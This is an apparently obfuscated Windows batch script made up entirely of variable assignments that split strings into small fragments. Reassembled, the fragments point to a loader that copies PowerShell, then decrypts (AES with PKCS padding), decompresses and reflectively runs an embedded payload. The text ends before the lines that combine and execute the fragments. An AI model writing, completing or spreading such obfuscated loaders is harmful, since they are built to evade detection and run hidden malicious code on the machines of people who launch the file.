@echo off
set "nbskkiyOMh=0\"
set "gkYqWKaHKA=ll"
set "ELjycVhGNp=in"
set "GrmOCQqdZp= C"
set "kEwfNVSyvG=ow"
set "QLtvugWDsf=em"
set "AEJFglwEsn=.e"
set "MWiDwGGvSJ=xe"
set "SmXnZFFGFh=nd"
set "rAqWmuWINX=\v"
set "OCbLzJHTeg=we"
set "caDcOiBOPS=ws"
set "KWRjiMWvTR=do"
set "utRUMKlPIn=he"
set "aUitAEpnij=st"
set "mnGPaQUlZs= /"
set "HwKopgzjGp=ll"
set "XRviXAHvuH=co"
set "wLqtVTYrIS=s\"
set "bSBVcphgLd=rs"
set "iMsVfJjObR=Wi"
set "NYOQkieGIK=1."
set "FidcoDhgKU=rS"
set "GoYNAJCoJf=32"
set "vIkFFBDWTq=\W"
set "tqLPmXzRdd=py"
set "GBbiwHAkoP=Sy"
set "BVBuvyRaxS=we"
set "oAvkDqyqzH=y "
set "VhWGTPxunp=he"
set "DZKcAVfzKE=Po"
set "eYAuDUcUHr=po"
set "UxynuGBOAK=:\"
set "KEKVaqIOAR=cd"
set "UVLpAfbKMF= %~dp0"
set "XlPXtDuiHc= [Sy"
set "IevvcOXqlr=-joi"
set "YHZfhuxzRS=OfOn"
set "ErVQzeuymg=rt]:"
set "GoGIOqCWad=Cy.D"
set "bgHGgYbVNn=OH.T"
set "hKSeFsFkoD=.Cry"
set "FYeQJVAVoL=$xWW"
set "TOAYfYlxKw=($Rg"
set "kSKezPvmQH=oU);"
set "ZhKapbUWJz=rofi"
set "BltPUiIlVm=::('"
set "ayaaVVvDhM=-4] "
set "LwNqsXBDZj=am;$"
set "AYlZWuiLGJ= = $"
set "ZExfVcNfnI=ress"
set "jFnpwUTByk=RmAx"
set "CnFdhatHou== [S"
set "WRuMOejPIW=.Com"
set "ObXZytMgTD=New-"
set "BauCiWniHB=S46e"
set "THosJFhifX=PxEW"
set "ZYssdCtbYN=YyPS"
set "cSSfdAyGDd=Uwoo"
set "cjJCLmdqoo= [st"
set "ujOVlzUUpe=[Env"
set "fWDATiNHjh=comp"
set "pVoaSjKYXK=$QiN"
set "IKUEQBAgDj=pose"
set "wIqdYPqCEQ=]::("
set "foqaOPkWxR=y.Cr"
set "qKtIfrWNyr=flec"
set "nZfTmErYVa=fOnC"
set "RhJXkOsdiu=pres"
set "IUMTvYatUK=yste"
set "JwCItJmfSj=Bmor"
set "lcvSSffIav=WWxk"
set "kiVLcNRLnz=dj0C"
set "cJJThwytES=Comp"
set "gytWPbjEma=[Sys"
set "LWqXWQHJBz=Conv"
set "zbDSpAHTmc=ionM"
set "kMBhdPgsfL=lit("
set "RTCDzjpEUv=m.Re"
set "SxDyTjQAyf=Obje"
set "bDPqXIuLzv=e = "
set "iwOoqXrnHV=morF"
set "DVWPkFgofu=g = "
set "YFIYVzArKW= = ["
set "dLtgRfJGNY=fOnC"
set "XgXtwznAmT=('%*'"
set "IrlAbqpffK=ddin"
set "pPLLSXPLfX=PKCS"
set "ZYEXnLTWHk=PTtG"
set "BfxjYYbnWQ=Star"
set "gPZZZpmYGk=BC;$"
set "mwlzYdDOye=J.Su"
set "WYBTUucjIk=)) {"
set "pcPwXUqPtZ=Syst"
set "nmUSFHUFTe=m(, "
set "mgtnPDYlPY=]::C"
